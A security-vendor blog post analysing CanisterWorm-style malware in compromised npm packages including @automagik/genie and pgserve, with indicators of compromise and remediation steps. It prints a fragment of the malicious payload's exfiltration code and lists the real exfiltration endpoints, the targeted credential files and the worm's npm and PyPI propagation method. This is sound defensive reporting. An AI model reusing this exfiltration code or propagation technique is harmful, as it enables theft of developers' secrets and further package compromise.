---
title: "Namastex.ai npm Packages Hit with TeamPCP-Style CanisterWorm Malware"
short_title: "Namastex.ai npm Packages Hit with CanisterWorm"
date: 2026-04-22 12:00:00 +0000
categories: [Supply Chain, npm]
tags: [CanisterWorm, CanisterSprawl, TeamPCP, npm, JavaScript, Infostealer, Worm, Developer Compromise, PyPI, Python]
canonical_url: https://socket.dev/blog/namastex-npm-packages-compromised-canisterworm
source: Socket
image:
  path: https://cdn.sanity.io/images/cgdhsj6q/production/7cc63050a1e0903e1a66f9d34a45b3d740bd6779-1254x1254.png?w=1000&q=95&fit=max&auto=format
description: "Malicious Namastex.ai npm packages appear to replicate TeamPCP-style Canister Worm tradecraft, including exfiltration and self-propagation."
---

Last month, we [responded](https://socket.dev/blog/canisterworm-npm-publisher-compromise-deploys-backdoor-across-29-packages) to CanisterWorm, a worm-enabled npm supply chain campaign that compromised legitimate publisher space, replaced package contents with install-time malware, used stolen publishing access to republish malicious versions, and relied on an Internet Computer Protocol (ICP) canister as a dead-drop command and control (C2) channel. This campaign was attributed to a set of TeamPCP supply chain attacks.

In this newly discovered npm incident, the malware uses the same core adversarial methods: install-time execution, credential theft from developer environments, off-host exfiltration, canister-backed infrastructure, and self-propagation logic intended to compromise additional packages. The overlap is notable enough on its own, and malicious packages included an explicit code reference to a `TeamPCP/LiteLLM method` inside the malicious payload.

The affected packages appear tied to Namastex Labs ([Namastex.ai](http://namastex.ai/)), a company that publicly markets AI consulting, autonomous agent systems, and open source AI tooling through its Automagik product suite.

The compromised packages are [`@automagik/genie`](https://socket.dev/npm/package/@automagik/genie/overview/) versions [`4.260421.33`](https://socket.dev/npm/package/@automagik/genie/overview/4.260421.33) through [`4.260421.39`](https://socket.dev/npm/package/@automagik/genie/overview/4.260421.39), along with [`pgserve`](https://socket.dev/npm/package/pgserve/overview/) versions [`1.1.11`](https://socket.dev/npm/package/pgserve/overview/1.1.11), [`1.1.12`](https://socket.dev/npm/package/pgserve/overview/1.1.12), and [`1.1.13`](https://socket.dev/npm/package/pgserve/overview/1.1.13), all of which carry the same embedded RSA key material used by the malicious payload.

Threat hunting on the same indicators of compromise also identified previously compromised [`@fairwords/websocket`](https://socket.dev/npm/package/@fairwords/websocket/overview/) versions [`1.0.38`](https://socket.dev/npm/package/@fairwords/websocket/overview/1.0.38) and [`1.0.39`](https://socket.dev/npm/package/@fairwords/websocket/overview/1.0.39), [`@fairwords/loopback-connector-es`](https://socket.dev/npm/package/@fairwords/loopback-connector-es) versions [`1.4.3`](https://socket.dev/npm/package/@fairwords/loopback-connector-es/overview/1.4.3) and [`1.4.4`](https://socket.dev/npm/package/@fairwords/loopback-connector-es/overview/1.4.4), and separate victim packages including [`@openwebconcept/design-tokens@1.0.3`](https://socket.dev/npm/package/@openwebconcept/design-tokens/overview/1.0.3) and [`@openwebconcept/theme-owc@1.0.3`](https://socket.dev/npm/package/@openwebconcept/theme-owc/overview/1.0.3), suggesting shared malware lineage, shared builder infrastructure, or direct code reuse across multiple publisher namespaces.

We are tracking the incident on Socket's dedicated CanisterSprawl supply chain attack page: [https://socket.dev/supply-chain-attacks/canistersprawl](https://socket.dev/supply-chain-attacks/canistersprawl).

The currently observed canister in the Namastex-related packages is not the same exact canister previously [documented](https://socket.dev/blog/canisterworm-npm-publisher-compromise-deploys-backdoor-across-29-packages) in CanisterWorm, and the upstream cause remains unresolved. There is a strong overlap in technique, code lineage, and threat actor tradecraft. As of this writing, this remains a developing story: additional malicious versions are still being published and identified, and the full scope of affected releases, maintainers, or release-path compromise is still under investigation.

![Socket AI Scanner flagged @automagik/genie@4.260421.36 as malicious](https://cdn.sanity.io/images/cgdhsj6q/production/66b5dc8af923d6f92ead09f1383372305e2a539f-1302x621.png?w=1600&q=95&fit=max&auto=format)
_Socket AI Scanner flagged `@automagik/genie@4.260421.36` as malicious, with the package still showing meaningful weekly download volume at the time of analysis._

These packages appear to target specialized developer workflows rather than broad consumer npm usage. At the time of review, `@automagik/genie` showed 6,744 weekly downloads and `pgserve` showed about 1,300 weekly downloads. In context, `@automagik/genie` is positioned as an AI coding and agent-orchestration CLI, while `pgserve` is an embedded PostgreSQL server for development and testing. The other affected packages span distinct usage contexts, from WebSocket and LoopBack-to-Elasticsearch integration to design-token and theming components used in Open WebConcept's design-system stack.

## What the payload does

The malware performs four major functions.

### 1. Harvests secrets from the victim environment

The script collects sensitive environment variables by matching names commonly associated with secrets, tokens, credentials, cloud providers, CI/CD systems, registries, and LLM platforms. It also reads high-value files from the local system, including:

- `.npmrc`
- SSH keys and SSH config
- `.git-credentials`
- `.netrc`
- cloud credentials for AWS, Azure, and GCP
- Kubernetes and Docker configuration
- Terraform, Pulumi, and Vault material
- database password files
- local `.env*` files
- shell history files

This is not consistent with any legitimate package installation workflow.

```javascript
const WEBHOOK_URL  = process.env.TEL_ENDPOINT || 'https://telemetry.api-monitor.com/v1/telemetry';
const ICP_CANISTER_ID = process.env.ICP_CANISTER_ID || 'cjn37-uyaaa-aaaac-qgnva-cai';

function exfilToWebhook(data, sig, sessionId) {
  // ...
  headers: {
    'Content-Type': 'application/json',
    'X-Session-ID': sessionId,
    'X-Request-Signature': sig,
  },
}

function canisterPost(payload) {
  const req = https.request({
    hostname: `${ICP_CANISTER_ID}.raw.icp0.io`,
    path: '/drop',
    method: 'POST',
  });
}
```

The malware exfiltrates stolen data to both a conventional webhook and an ICP canister endpoint, using the hardcoded canister ID cjn37-uyaaa-aaaac-qgnva-cai.

### 2. Targets browser and wallet data

The payload also attempts to access browser and crypto-wallet artifacts, including Chrome login storage and extension data associated with MetaMask and Phantom, along with local wallet files such as Solana, Ethereum, Bitcoin, Exodus, and Atomic Wallet data.

### 3. Exfiltrates stolen data off-host

The payload sends data to an HTTPS webhook and to an Internet Computer canister endpoint. The hardcoded infrastructure includes:

- `https://telemetry.api-monitor[.]com/v1/telemetry`
- `https://telemetry.api-monitor[.]com/v1/drop`
- `cjn37-uyaaa-aaaac-qgnva-cai.raw.icp0[.]io/drop`

When a bundled RSA public key is present, the payload encrypts stolen data using a hybrid scheme built around AES-256-CBC and RSA-OAEP-SHA256. If no public key is available, it falls back to plaintext packaging.

### 4. Attempts self-propagation across ecosystems

The payload contains logic to extract npm tokens from the victim machine, identify packages the victim can publish, download those package tarballs, inject a new malicious `postinstall` hook, and republish the packages.

It also contains PyPI propagation logic. The script generates a Python `.pth`-based payload designed to execute when Python starts, then prepares and uploads malicious Python packages with Twine if the required credentials are present.

In other words, this is not just a credential stealer. It is designed to turn one compromised developer environment into additional package compromises.

![Socket AI Scanner summary of the malware](https://cdn.sanity.io/images/cgdhsj6q/production/105032abcda2cd42ace6ec5e02599f2f4447d643-562x576.png?w=1600&q=95&fit=max&auto=format)
_Socket AI Scanner summarized the install-time malware as a credential stealer with canister-backed exfiltration and worm-like propagation behavior._

## Why this looks like a compromise, not just a malicious new package

Several aspects of the ecosystem make a compromise scenario plausible.

First, the affected packages appear to belong to a real public project with active GitHub repositories, documentation, and user-facing positioning around AI tooling.

Second, `@automagik/genie` has meaningful adoption for a newly created package, which raises the stakes considerably for downstream users.

Third, `pgserve` appears to have been updated on npm without corresponding Git tags for the newly published versions `1.1.12` and `1.1.13`, even though the repository's public tags stop at `v1.1.10`. That mismatch does not prove compromise by itself, but in context it is the kind of release anomaly that deserves scrutiny.

## Tradecraft overlap with recent canister-backed npm worm

One reason this discovery stands out is the payload design.

This implant combines:

- install-time execution through `postinstall`
- broad credential theft from developer systems
- off-host exfiltration through both a webhook and an ICP canister
- self-propagation through stolen npm publishing credentials
- cross-ecosystem propagation logic targeting PyPI

That tradecraft strongly resembles the pattern seen in recent worm-enabled npm compromises that used canister-backed infrastructure.

## IOCs and hunt pivots

The following indicators or compromise are useful for identifying sibling packages or related compromises.

### File hashes

- `dist/env-compat.cjs: c19c4574d09e60636425f9555d3b63e8cb5c9d63ceb1c982c35e5a310c97a839`
- `dist/public.pem: 834b6e5db5710b9308d0598978a0148a9dc832361f1fa0b7ad4343dcceba2812`

### RSA public key fingerprint

- DER SHA-256: `87259b0d1d017ad8b8daa7c177c2d9f0940e457f8dd1ab3abab3681e433ca88e`

### Distinctive strings

- `node dist/env-compat.cjs || true`
- `pkg-telemetry`
- `dist-propagation-report`
- `pypi-pth-exfil`
- `Technique: .pth file injection (TeamPCP/LiteLLM method)`
- `telemetry.api-monitor.com`
- `cjn37-uyaaa-aaaac-qgnva-cai`
- `X-Session-ID`
- `X-Request-Signature`

### Exfiltration endpoints

- `https://telemetry.api-monitor[.]com/v1/telemetry`
- `https://telemetry.api-monitor[.]com/v1/drop`
- `cjn37-uyaaa-aaaac-qgnva-cai.raw.icp0[.]io/drop`

## What defenders should do now

Teams should treat the affected versions as malicious until proven otherwise.

Recommended actions:

1. Block and remove the identified package versions from development and CI/CD environments.
2. Rotate npm tokens, GitHub tokens, cloud credentials, SSH keys, and any secrets that may have been present on systems where these packages were installed.
3. Review package publish history for unexpected releases tied to the same maintainers or tokens.
4. Hunt across internal package mirrors, artifact caches, and repository history for the IOCs above.
5. Audit for related packages containing the same `public.pem`, the same webhook host, or the same `postinstall` pattern.
6. Compare npm-published tarballs against public GitHub tags and release artifacts to spot package-to-repo mismatches.

## Package Versions

1. [@automagik/genie@4.260421.33](https://socket.dev/npm/package/@automagik/genie/overview/4.260421.33)
2. [@automagik/genie@4.260421.34](https://socket.dev/npm/package/@automagik/genie/overview/4.260421.34)
3. [@automagik/genie@4.260421.35](https://socket.dev/npm/package/@automagik/genie/overview/4.260421.35)
4. [@automagik/genie@4.260421.36](https://socket.dev/npm/package/@automagik/genie/overview/4.260421.36)
5. [@automagik/genie@4.260421.37](https://socket.dev/npm/package/@automagik/genie/overview/4.260421.37)
6. [@automagik/genie@4.260421.38](https://socket.dev/npm/package/@automagik/genie/overview/4.260421.38)
7. [@automagik/genie@4.260421.39](https://socket.dev/npm/package/@automagik/genie/overview/4.260421.39)
8. [pgserve@1.1.11](https://socket.dev/npm/package/pgserve/overview/1.1.11)
9. [pgserve@1.1.12](https://socket.dev/npm/package/pgserve/overview/1.1.12)
10. [pgserve@1.1.13](https://socket.dev/npm/package/pgserve/overview/1.1.13)
11. [@fairwords/websocket@1.0.38](https://socket.dev/npm/package/@fairwords/websocket/overview/1.0.38)
12. [@fairwords/websocket@1.0.39](https://socket.dev/npm/package/@fairwords/websocket/overview/1.0.39)
13. [@fairwords/loopback-connector-es@1.4.3](https://socket.dev/npm/package/@fairwords/loopback-connector-es/overview/1.4.3)
14. [@fairwords/loopback-connector-es@1.4.4](https://socket.dev/npm/package/@fairwords/loopback-connector-es/overview/1.4.4)
15. [@openwebconcept/design-tokens@1.0.3](https://socket.dev/npm/package/@openwebconcept/design-tokens/overview/1.0.3)
16. [@openwebconcept/theme-owc@1.0.3](https://socket.dev/npm/package/@openwebconcept/theme-owc/overview/1.0.3)
